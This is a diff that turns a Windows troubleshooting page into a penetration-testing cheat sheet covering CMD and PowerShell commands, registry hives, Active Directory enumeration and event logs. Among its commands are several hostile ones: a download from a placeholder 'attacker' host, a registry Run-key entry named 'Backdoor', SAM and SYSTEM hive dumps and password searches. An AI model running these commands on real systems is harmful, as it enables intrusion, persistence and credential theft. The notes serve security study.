@@ -1,50 +1,219 @@
-# 🖥️ Windows System Administration & Diagnostics
+# 🖥️ Windows System Administration
 
-> **Objective:** Maintaining system health, troubleshooting hardware/software conflicts, and ensuring data integrity through native Windows utilities.
-
----
-
-## 🛠️ Essential Diagnostic Utilities
-
-| Utility | Command | Primary Use Case |
-| :--- | :--- | :--- |
-| **System Configuration** | `msconfig` | Managing **Clean Boots**, disabling startup services, and troubleshooting boot-time driver issues. |
-| **System Information** | `msinfo32` | Exhaustive summary of **Hardware Resources**, Components, and Software Environments (BIOS version, Secure Boot state, Driver versions). |
-| **Event Viewer** | `eventvwr.msc` | The primary log for system, security, and application errors. |
-| **Resource Monitor** | `resmon` | Real-time analysis of CPU, Disk, Network, and Memory "per-process" usage. |
+> **Scope:** Windows internals, PowerShell, Registry, and AD basics — essential for Windows exploitation and defense.
 
 ---
 
-## 🏗️ The Windows Registry
-The Registry is a hierarchical database that stores low-level settings for the OS and applications. It is organized into **Hives**.
+## 📋 Essential Commands (CMD)
 
+```cmd
+:: System info
+systeminfo
+hostname
+whoami /all
+net user
+net localgroup administrators
 
+:: Network
+ipconfig /all
+netstat -ano
+route print
+arp -a
+nslookup domain.com
 
-### Core Registry Hives
-*   **HKEY_LOCAL_MACHINE (HKLM)**: System-wide settings (Hardware, Security, Software). These apply to all users.
-*   **HKEY_CURRENT_USER (HKCU)**: Specific settings for the currently logged-in user (Desktop wallpaper, keyboard layout).
-*   **HKEY_CLASSES_ROOT (HKCR)**: Information on file associations and OLE (Object Linking and Embedding).
+:: Processes & Services
+tasklist /svc
+taskkill /PID 1234 /F
+sc query state= all
+wmic service get name,pathname,startmode
 
-> **Expert Note**: The Registry is often targeted by malware for **Persistence** (e.g., the `Run` or `RunOnce` keys), allowing code to execute automatically upon user login.
+:: File operations
+dir /s /b C:\*.txt
+type file.txt
+findstr /si "password" *.txt *.ini *.config *.xml
+icacls "C:\path\to\file"
+```
 
 ---
 
-## 🛡️ Advanced Data Protection
-Securing the Windows environment involves a combination of hardware-backed encryption and logical backup services.
+## ⚡ PowerShell Essentials
 
-### 1. BitLocker & TPM
-*   **BitLocker**: Full Disk Encryption (FDE) that protects data at rest.
-*   **TPM (Trusted Platform Module)**: A specialized hardware chip that stores cryptographic keys. It ensures the system hasn't been tampered with (Measured Boot) before releasing the BitLocker decryption key.
+### Navigation & Files
+```powershell
+Get-ChildItem -Recurse -Filter "*.txt"    # Find files
+Get-Content file.txt                       # Read file
+Select-String -Path *.log -Pattern "error" # Grep equivalent
+Get-Acl "C:\path"                          # Check permissions
+Copy-Item src dst                          # Copy
+Move-Item src dst                          # Move
+```
 
-### 2. VSS (Volume Shadow Copy Service)
-*   **Mechanism**: A framework that allows taking manual or automatic backup copies/snapshots of computer files or volumes, even when they are in use.
-*   **Admin Use**: Used by "System Restore" and "Previous Versions" to recover accidentally deleted files.
-*   **Red Team Context**: Attackers often attempt to delete Shadow Copies (`vssadmin delete shadows /all`) to prevent a victim from recovering their data after a ransomware attack.
+### System Information
+```powershell
+Get-ComputerInfo                           # Full system info
+Get-Process                                # Running processes
+Get-Service | Where-Object {$_.Status -eq "Running"}
+Get-NetTCPConnection                       # Open connections
+Get-LocalUser                              # Local users
+Get-LocalGroupMember Administrators        # Admin group members
+```
+
+### Network
+```powershell
+Test-NetConnection target -Port 80         # Test port
+Resolve-DnsName domain.com                 # DNS lookup
+Get-NetIPAddress                           # IP config
+Get-NetRoute                               # Routing table
+```
+
+### Remote Execution
+```powershell
+# WinRM (port 5985)
+Enter-PSSession -ComputerName target -Credential domain\user
+Invoke-Command -ComputerName target -ScriptBlock { whoami }
+
+# Enable WinRM
+Enable-PSRemoting -Force
+```
+
+### Download Files
+```powershell
+# Download from web
+Invoke-WebRequest -Uri http://attacker/file -OutFile file.exe
+(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\temp\file.exe')
+
+# Base64 encode/decode
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe"))
+[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String($b64))
+```
 
 ---
 
-## 💡 Expert Tip: The Diagnostic Workflow
-When a system is experiencing "Blue Screen of Death" (BSOD) or instability:
-1.  Use `msinfo32` to check for **Driver Conflicts** or outdated BIOS versions.
-2.  Use `msconfig` to perform a **Diagnostic Startup** (loading only basic devices and services).
-3.  If the issue persists in a clean boot, it is likely a **Hardware failure** (check RAM/Disk health).
+## 🏗️ Windows Registry
+
+### Key Hives
+| Hive | Contains | Pentest Relevance |
+|------|----------|-------------------|
+| HKLM\SAM | User accounts & hashes | Credential extraction |
+| HKLM\SYSTEM | Boot config, services | Service exploitation |
+| HKLM\SOFTWARE | Installed programs | Persistence (Run keys) |
+| HKCU | Current user settings | User-specific persistence |
+
+### Important Registry Paths
+```
+# Persistence (auto-run)
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Credentials
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  (AutoLogon)
+HKLM\SYSTEM\CurrentControlSet\Services\  (service accounts)
+
+# Security settings
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  (AlwaysInstallElevated)
+HKLM\SYSTEM\CurrentControlSet\Control\Lsa  (credential protection)
+```
+
+### Registry Commands
+```cmd
+:: Query a key
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+:: Add persistence
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"
+
+:: Export/Import
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+```
+
+---
+
+## 🏢 Active Directory Basics
+
+### Structure
+```
+Forest (top-level container)
+└── Domain (e.g., corp.local)
+    ├── Organizational Units (OUs)
+    │   ├── Users
+    │   ├── Computers
+    │   └── Groups
+    ├── Group Policy Objects (GPOs)
+    └── Domain Controllers (DCs)
+```
+
+### Key Concepts
+| Concept | Description | Pentest Relevance |
+|---------|-------------|-------------------|
+| Domain Controller | Hosts AD DS, authenticates users | Primary target |
+| NTDS.dit | AD database (all hashes) | DCSync target |
+| KRBTGT | Kerberos service account | Golden Ticket |
+| GPO | Policy enforcement | Lateral movement, persistence |
+| SPN | Service Principal Name | Kerberoasting |
+| Trust | Cross-domain access | Trust abuse |
+
+### AD Enumeration Commands
+```cmd
+:: From a domain-joined machine
+net user /domain
+net group "Domain Admins" /domain
+net group "Domain Controllers" /domain
+nltest /dclist:domain.local
+```
+
+```powershell
+# PowerShell AD module
+Get-ADUser -Filter * -Properties *
+Get-ADGroup -Filter * | Select-Object Name
+Get-ADComputer -Filter * | Select-Object DNSHostName
+Get-ADDomainController -Filter *
+```
+
+---
+
+## 📊 Event Viewer (Key Logs)
+
+| Log | Path | Contains |
+|-----|------|----------|
+| Security | Security.evtx | Logons, privilege use, audit |
+| System | System.evtx | Services, drivers, shutdown |
+| Application | Application.evtx | App errors, installations |
+| PowerShell | PowerShell Operational | Script execution |
+| Sysmon | Sysmon Operational | Enhanced process/network logging |
+
+### Quick Event Viewer Commands
+```powershell
+# Recent failed logins
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20
+
+# Recent successful logins
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 20
+
+# New services installed
+Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} -MaxEvents 10
+```
+
+---
+
+## 💡 Pentest-Relevant Windows Knowledge
+
+| Concept | Why It Matters |
+|---------|---------------|
+| SAM database | Local password hashes |
+| LSASS process | Credentials in memory (Mimikatz) |
+| Token privileges | SeImpersonate → Potato attacks |
+| Services (unquoted paths) | Privilege escalation |
+| Scheduled Tasks | Persistence, privesc |
+| DLL search order | DLL hijacking |
+| UAC | Bypass for admin execution |
+| AMSI | PowerShell defense to bypass |
+| AppLocker/WDAC | Execution restrictions to bypass |
+
+---
+
+## 🔗 Associated Tools
+- [Metasploit](../../TOOLS/metasploit.md) - Windows exploitation
+- [Hashcat](../../TOOLS/Hashcat.md) - Crack Windows hashes
